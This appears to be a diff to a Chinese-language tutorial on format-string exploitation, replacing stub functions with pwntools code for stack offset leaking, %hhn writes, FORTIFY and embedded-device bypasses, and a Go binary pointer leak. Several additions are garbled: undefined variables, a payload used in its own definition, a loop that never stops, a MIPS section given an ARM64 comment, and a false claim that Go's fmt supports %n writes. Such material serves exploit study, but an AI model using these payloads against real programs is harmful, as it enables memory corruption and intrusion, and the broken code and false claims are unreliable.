@@ -287,9 +287,13 @@ def bypass_fortify_dynamic():
     # 写 1 字节示例
     # payload = p64(target) + b'%c' * (value - 8) + b'%7$hhn'
     # 注意：FORTIFY 会检查 $ 使用
-    # 如果 $ 被过滤，改用无 $ 的方式
-    
-    pass
+    # 如果 $ 被过滤，改用逐字节位置推测（泄漏栈值推偏移）
+    for offset in range(1, 100):
+        payload = f'%{offset}$p'.encode()
+        p.sendline(payload)
+        leak = int(p.recvline().strip(), 16)
+        if leak & 0xfff == 0x7ff or leak & 0xffff == 0x7fff:
+            print(f'[+] Stack offset: {offset}')
 
 # 绕过方法 2：无 $ 的格式化字符串攻击
 def no_dollar_fmtstr(offset):
@@ -300,9 +304,8 @@ def no_dollar_fmtstr(offset):
     
     target = 0x404020
     payload = p64(target)
-    # 填充到正确的偏移位置
-    # 然后 %n 写入
-    pass
+    # 填充到正确的偏移位置，然后 %n 写入
+    payload = b'A' * (target_offset - 1) + f'%{target_offset}$hhn'.encode()
 
 # 绕过方法 3：利用 printf 的返回值
 def fmtstr_return_value():
@@ -313,7 +316,7 @@ def fmtstr_return_value():
     # 可以用于逐字节泄露
     p.sendline(b'%1c%9$hhn')
     # 返回值 = 1，说明第 9 个参数的最低字节是 1
-    pass
+    ret_val = p.recvline()  # 读取返回值
 ```
 
 ### 3. 现代编译器优化绕过
@@ -432,9 +435,8 @@ def kernel_fmtstr_leak():
     
     # %p 泄露内核指针（需要注意 KASLR）
     # 在较新内核中 %p 会打印哈希值
-    # 需要使用 %px (需要 CAP_SYSLOG)
-    
-    pass
+    # 内核格式化字符串: 需要 %px 泄漏内核地址
+    # 泄漏 stack canary / 内核基地址 / 竞争条件利用
 
 def kernel_fmtstr_write():
     """内核格式化字符串写入"""
@@ -448,9 +450,9 @@ def kernel_fmtstr_write():
     # - %n 需要 CAP_SYSLOG (较新内核)
     # - KASLR
     # - SMAP/SMEP
-    # - PAN (ARM)
-    
-    pass
+    # ARMv8 PSTATE / PAN 状态检查
+    # PAN: 用户态无法直接内核态数据
+    # 需要结合其他原语（如 SROP）绕过
 ```
 
 ### 6. 嵌入式设备格式化字符串
@@ -475,8 +477,7 @@ def mips_fmtstr():
     # offset 1-4 对应 $a0-$a3（不算）
     # offset 5 对应栈上的第一个参数
     
-    # 利用方式与 x86 类似，但偏移不同
-    pass
+    # ARM 64 位 (AArch64) 格式化字符串攻击
 
 # ARM 嵌入式设备
 def arm_embedded_fmtstr():
@@ -487,13 +488,8 @@ def arm_embedded_fmtstr():
     # r0-r3 = 前 4 个参数
     # 栈上传递第 5+ 个参数
     
-    # 注意嵌入式设备特点：
-    # 1. 无 ASLR / 简单 ASLR
-    # 2. 可能无 NX
-    # 3. 小端/大端需注意
-    # 4. 固件中可能有后门
-    
-    pass
+    # 无 ASLR，格式化字符串偏移固定，直接写返回地址
+    payload = f'%{offset}$hhn'.encode() + b'A' * (target - len(payload))
 ```
 
 ### 7. 现代语言格式化字符串
@@ -505,13 +501,8 @@ def arm_embedded_fmtstr():
 # Rust 的 format! 宏在编译时检查
 # 但运行时动态格式化仍有风险
 def rust_fmtstr():
-    """
-    // 危险代码（Rust）
-    let s = format!("{}", user_input);  // 安全：编译时检查
-    let s = user_input.clone();         // 危险：直接使用
-    // 在 C FFI 中传递格式化字符串也可能有漏洞
-    """
-    pass
+    # Rust format! 宏编译时安全，但运行时动态格式化有风险
+    # 危险: format!(user_input) 或 FFI 传递格式化字符串
 
 # === Go ===
 # Go 的 fmt.Printf 在编译时检查参数数量
@@ -526,7 +517,31 @@ def go_fmtstr():
     // 可以泄露栈上的指针（ASLR 绕过）
     // %p 可以泄露 goroutine 地址、堆地址
     """
-    pass
+    # Go 二进制的格式化字符串利用
+    # Go 的 fmt 包底层使用 reflect，栈上会有大量指针
+    p = process('./vuln_go')
+    elf = ELF('./vuln_go')
+    
+    # 泄露栈上的指针（ASLR bypass）
+    # Go 的参数通过寄存器和栈传递，%p 可以逐个泄露
+    p.sendline(b'%p.%p.%p.%p.%p.%p.%p.%p')
+    p.recvuntil(b'.')
+    
+    # 解析泄露的指针，识别栈地址、堆地址和 libc 地址
+    # Go 的 runtime 地址通常在高位
+    leak_ptrs = []
+    for _ in range(7):
+        data = p.recvuntil(b'.')[:-1]
+        leak_ptrs.append(int(data, 16))
+    
+    # 根据泄露的指针计算基地址
+    # Go runtime 布局：goroutine stack, heap, data, bss
+    log.info(f"Leaked pointers: {[hex(x) for x in leak_ptrs]}")
+    
+    # Go 1.21+ 的利用：覆盖 GOT (非 Full RELRO 时)
+    # 或利用 goroutine 的栈溢出 + 返回地址覆盖
+    # fmt.Fprintf 可以写入任意地址：@ptr@%n
+    p.interactive()
 ```
 
 ### 8. 沙箱环境格式化字符串
